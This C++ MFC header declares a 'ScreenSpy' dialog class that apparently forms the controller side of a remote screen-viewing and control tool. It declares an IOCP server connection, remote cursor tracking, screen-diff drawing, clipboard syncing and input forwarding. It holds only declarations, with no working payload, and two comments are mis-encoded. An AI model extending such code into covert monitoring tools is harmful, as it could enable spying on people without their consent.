#if !defined(AFX_SCREENSPY_H__5F74528D_9ABD_404E_84D2_06C96A0615F4__INCLUDED_)
#define AFX_SCREENSPY_H__5F74528D_9ABD_404E_84D2_06C96A0615F4__INCLUDED_

#include "CursorInfo.h"

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// ScreenSpyDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CScreenSpyDlgs dialog


class CScreenSpyDlgs : public CDialog
{
// Construction
public:
	void OnReceiveComplete();
	void OnReceive();
	CScreenSpyDlgs(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
// Dialog Data
	//{{AFX_DATA(CScreenSpyDlgs)
	enum { IDD = IDD_DIALOG_SCREENSPY1 };
		// NOTE: the ClassWizard will add data members here
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CScreenSpyDlgs)
	public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	//}}AFX_VIRTUAL

// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CScreenSpyDlgs)
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClose();
	afx_msg void OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	HICON m_hIcon;
	void InitMMI();
	MINMAXINFO m_MMI;
	void DrawTipString(CString str);
	HDC m_hDC, m_hMemDC, m_hPaintDC;
	HBITMAP	m_hFullBitmap;
	LPVOID m_lpScreenDIB;
	LPBITMAPINFO m_lpbmi, m_lpbmi_rect;
	UINT m_nCount;
	UINT m_HScrollPos, m_VScrollPos;
	HCURSOR	m_hRemoteCursor;
	DWORD	m_dwCursor_xHotspot, m_dwCursor_yHotspot;
	POINT	m_RemoteCursorPos;
	BYTE	m_bCursorIndex;
	CCursorInfo	m_CursorInfo;
	void ResetScreen();
	void DrawFirstScreen();
	void DrawNextScreenDiff();	// ≤Ó“Ï∑®
	void DrawNextScreenRect();	// ∏Ù––…®√Ë∑®
	void SendResetScreen(int nBitCount);
	void SendResetAlgorithm(UINT nAlgorithm);
	bool SaveSnapshot();
	void UpdateLocalClipboard(char *buf, int len);
	void SendLocalClipboard();
	int	m_nBitCount;
	bool m_bIsFirst;
	bool m_bIsTraceCursor;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	bool m_bIsCtrl;
	void SendNext();
	void SendCommand(MSG* pMsg);
	LRESULT OnGetMiniMaxInfo(WPARAM, LPARAM);
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_SCREENSPYDLG_H__8C27AA31_1C2A_428A_A937_BC00F2519DB1__INCLUDED_)
